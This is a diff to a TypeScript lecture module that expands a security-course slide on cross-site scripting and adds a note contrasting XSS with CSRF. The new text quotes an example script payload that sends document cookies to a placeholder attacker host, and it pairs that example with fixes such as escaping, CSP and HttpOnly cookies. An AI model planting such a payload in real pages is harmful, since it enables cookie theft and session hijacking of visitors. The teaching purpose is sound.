@@ -121,7 +121,13 @@ export const securityFundamentals: Lecture = {
       left: {
         id: "security-fundamentals-step-6-left",
         type: "prose",
-        body: `**What it is:** attacker-controlled JavaScript runs in the victim's browser.\n\n**Typical impact:** steal tokens, perform actions as the user.\n\n**Fix checklist:**\n\n- **Output encoding/escaping** (server and client)\n- **Content Security Policy (CSP)**\n- **Don't store tokens in \`localStorage\`** — XSS can read everything there`,
+        body: `> 💥 **The browser trusts every script in a page as if the page wrote it. XSS sneaks the attacker's script in — and it gets that same trust.**\n\n**How it happens:** user input is rendered into the page's HTML without escaping. Post a comment like \`<script>fetch('evil.com?c='+document.cookie)</script>\` and every visitor's browser runs it.\n\n**Impact:** steal tokens / cookies → hijack the session, or act as the user.\n\n**Fix checklist:**\n\n- **Output encoding / escaping** — render \`<\` as \`&lt;\` so input shows as text, not markup *(the root fix)*\n- **Content Security Policy (CSP)** — second layer: only run scripts from allowed sources\n- **Tokens in HttpOnly cookies, not \`localStorage\`** — JS can read localStorage; HttpOnly it cannot`,
+        callouts: [
+          {
+            tone: "info",
+            text: "XSS vs CSRF: XSS runs the attacker's code inside your page; CSRF runs no code at all — it just rides the cookie the browser auto-sends. Different bugs, different fixes.",
+          },
+        ],
       },
       right: {
         id: "security-fundamentals-step-6-right",
